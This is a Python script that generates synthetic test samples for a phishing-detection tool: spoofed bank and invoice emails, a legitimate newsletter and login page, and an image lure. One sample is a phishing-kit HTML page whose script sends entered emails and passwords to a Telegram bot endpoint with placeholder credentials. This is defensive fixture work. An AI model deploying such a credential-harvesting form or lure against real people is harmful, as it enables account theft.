"""Synthetic demonstration samples (ТЗ 5.2: «демонстрационные образцы или инструкция по получению данных»).

Everything here is invented (domains under .example, placeholder tokens): no data of the Customer. Regenerate with
    python scripts/make_demo_samples.py [out_dir]            # default: samples/demo
Then:  python phishctl.py analyze samples/demo/01_phish_email_bank_spoof.eml
       python phishctl.py analyze samples/demo/05_legit_login_page.html --url https://www.examplebank.example/login   # a saved page needs its URL
"""
import os
import sys
from email.message import EmailMessage

OUT = sys.argv[1] if len(sys.argv) > 1 else os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "samples", "demo")
os.makedirs(OUT, exist_ok=True)

KIT = """<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>Secure document</title></head><body>
<h2>Protected document</h2><p>Sign in with your mailbox to view the document.</p>
<form id="f"><input type="email" name="email" placeholder="Email"><input type="password" name="pass" placeholder="Password">
<button type="submit">View document</button></form>
<script>
document.getElementById('f').onsubmit = function (e) {
  e.preventDefault();
  fetch("https://api.telegram.org/bot123456789:AAExampleExampleExampleExampleExample00/sendMessage",
        {method: "POST", body: JSON.stringify({chat_id: "-1000000000", text: this.email.value + ":" + this.pass.value})});
};
</script></body></html>"""

LOGIN = """<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>Example Bank - sign in</title></head><body>
<h1>Example Bank online</h1><form action="/auth/login" method="post"><input type="text" name="login"><input type="password" name="password">
<button type="submit">Sign in</button></form><footer><a href="/privacy">Privacy policy</a></footer></body></html>"""


def eml(path, subject, sender, to, text, html=None, attach=None):
    m = EmailMessage()
    m["Subject"], m["From"], m["To"] = subject, sender, to
    m["Date"] = "Mon, 02 Mar 2026 10:00:00 +0000"
    m.set_content(text)
    if html:
        m.add_alternative(html, subtype="html")
    if attach:
        name, data, mime = attach
        main, sub = mime.split("/")
        m.add_attachment(data, maintype=main, subtype=sub, filename=name)
    with open(os.path.join(OUT, path), "wb") as f:
        f.write(bytes(m))


eml("01_phish_email_bank_spoof.eml", "Your card will be blocked today", '"Sberbank" <security@sber-secure-alerts.example>', "client@mail.example",
    "Dear client, Sberbank detected a suspicious payment. Confirm your identity within 24 hours: https://login.sber-secure-alerts.example/verify",
    '<p>Dear client, Sberbank detected a suspicious payment.</p><p><a href="https://login.sber-secure-alerts.example/verify">Confirm your identity</a> within 24 hours.</p>')
eml("02_phish_email_html_attachment.eml", "Invoice 4821 - payment details", '"Accounts" <billing@docs-share-portal.example>', "client@mail.example",
    "Please find the invoice attached and sign in to view it.", attach=("Invoice_4821.html", KIT.encode(), "text/html"))
eml("03_legit_email_newsletter.eml", "Your monthly statement is ready", '"Example Bank" <news@examplebank.example>', "client@mail.example",
    "Your monthly statement is available in your online account. https://www.examplebank.example/statements",
    '<p>Your monthly statement is available in your <a href="https://www.examplebank.example/statements">online account</a>.</p>')
with open(os.path.join(OUT, "04_phish_html_attachment_password_telegram.html"), "w", encoding="utf-8") as f:
    f.write(KIT)
with open(os.path.join(OUT, "05_legit_login_page.html"), "w", encoding="utf-8") as f:
    f.write(LOGIN)

try:  # an image lure: a fake "protected document" with a login box
    from PIL import Image, ImageDraw
    im = Image.new("RGB", (800, 520), (235, 238, 244))
    d = ImageDraw.Draw(im)
    d.rectangle((220, 90, 580, 430), fill=(255, 255, 255), outline=(120, 120, 120))
    d.text((300, 120), "Protected file - Login to continue", fill=(20, 20, 20))
    d.rectangle((260, 190, 540, 225), outline=(90, 90, 90)); d.text((270, 200), "name@example.com", fill=(90, 90, 90))
    d.rectangle((260, 250, 540, 285), outline=(90, 90, 90)); d.text((270, 260), "Password", fill=(90, 90, 90))
    d.rectangle((260, 330, 540, 370), fill=(30, 100, 50)); d.text((370, 342), "View", fill=(255, 255, 255))
    im.save(os.path.join(OUT, "06_phish_image_fake_document.png"))
except ImportError:
    print("Pillow is not installed: the image sample was skipped")
print("samples written to", os.path.abspath(OUT))
